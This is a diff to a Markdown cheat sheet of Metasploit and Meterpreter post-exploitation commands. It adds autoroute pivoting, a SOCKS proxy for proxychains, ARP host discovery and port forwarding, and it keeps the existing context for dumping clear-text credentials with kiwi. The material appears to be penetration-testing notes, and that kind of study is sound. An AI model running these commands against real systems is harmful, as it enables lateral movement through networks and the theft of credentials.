@@ -16,11 +16,39 @@ grep smb search type:exploit
 use <Module Name>
 info
 ```
-
+### Routes
 ##### Add Route
 ```bash
-route add <IP> <Subnet> <Session #>
+meterpreter > ifconfig
+# get <Subnet Mask of Exploited Target>
+
+route add <IP> <Subnet Mask of Exploited Target> <Session #>
+
+use post/multi/manage/autoroute
+set SESSION <Session #>
+set NETMASK <Subnet Mask of Exploited Target>
+run
 ```
+
+##### View Routes
+```bash
+route
+Subnet       Netmask        Gateway
+```
+### SOCKS
+##### Start SOCKS Proxy for Proxy Chains
+```bash
+cat /etc/proxychains4.conf
+
+use auxiliary/server/socks_proxy
+show options
+# SRVPORT and VERSION must match settings in /etc/proxychains4.conf
+set SRVPORT <Port # from /etc/proxychains4.conf> 
+set VERSION <Version> # socks4 = 4a, socks5 = 5.
+run
+jobs
+```
+###
 
 ##### Use with Nessus
 ```bash
@@ -62,6 +90,18 @@ set SESSION <Session ID>
 ```
 
 # Meterpreter
+### Network Interfaces
+```bash
+meterpreter > ifconfig
+```
+### Host Discovery
+```bash
+arp -a
+
+use auxiliary/scanner/discovery/arp_sweep
+
+use post/windows/gather/arp_scanner
+```
 ### Migrate to Another Process Automatically
 ```bash
 # As script
@@ -76,35 +116,7 @@ run
 ```bash
 migrate -N <Process Name>.<Extension>
 ```
-### Pivot With Meterpreter and Proxychains
-```bash
-# Establish meterpreter session
-# Background meterpreter
-background
-use post/multi/manage/autoroute
-show options
-set SESSION <meterpreter session #>
-set NETMASK <Netmask of NIC on exploited target>
-run
 
-cat /etc/proxychains4.conf
-
-use auxiliary/server/socks_proxy
-show options
-# SRVPORT = 1080
-# VERSION = 5
-# SRVPORT and VERSION must match settings in /etc/proxychains4.conf
-set SRVPORT 9050 
-set VERSION 4a # socks4 = 4a, socks5 = 5.
-run
-jobs
-
-# Run nmap scan to find open ports that can be used with port forwarding
-proxychains nmap -sT -Pn -p 21-25,80,139,445,8080 <Target Host>
-```
-##### [Pivoting attack traffic](https://www.youtube.com/watch?v=Wn59J8PiIl0)
-##### [84 post exploitation pivoting autoroute](https://www.youtube.com/watch?v=jjUamstPDWo)
-##### [Multi Manage Network Route via Meterpreter Session - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute)
 ### Dump Clear Text Credentials and Hashes
 ```bash
 sessions -i <Session #>
@@ -112,11 +124,33 @@ load kiwi
 help
 creds_all
 ```
-### Port Forwarding with Metepreter
+### Port Forwarding
+##### portfwd
+| Flag | Description |
+|------|-------------|
+| -h | Help banner.
+| -i [opt] | Index of the port forward entry to interact with (see the "list" command).
+| -l [opt] | Forward: local port to listen on. Reverse: local port to connect to.
+| -L [opt] | Forward: local host to listen on (optional). Reverse: local host to connect to.
+| -p [opt] | Forward: remote port to connect to. Reverse: remote port to listen on.
+| -r [opt] | Forward: remote host to connect to.
+| -R       | Indicates a reverse port forward.
+
 ```bash
 portfwd add -l <Remote Port #> -p <Local Port #> -r <Remote Host>
 portfwd list
 ```
+##### post/windows/manage/portproxy
+```bash
+use post/windows/manage/portproxy
+set CONNECT_ADDRESS <Remote IP for Forwarding>
+set CONNECT_PORT <Remote Port for Forwarding>
+set LOCAL_ADDRESS <Local IP for Listening>
+set LOCAL_PORT  <Local Port for Listening>
+set SESSION <Session #>
+run
+```
+
 ### Escalate Privileges
 #### Linux PrivEsc
 #### Windows PrivEsc
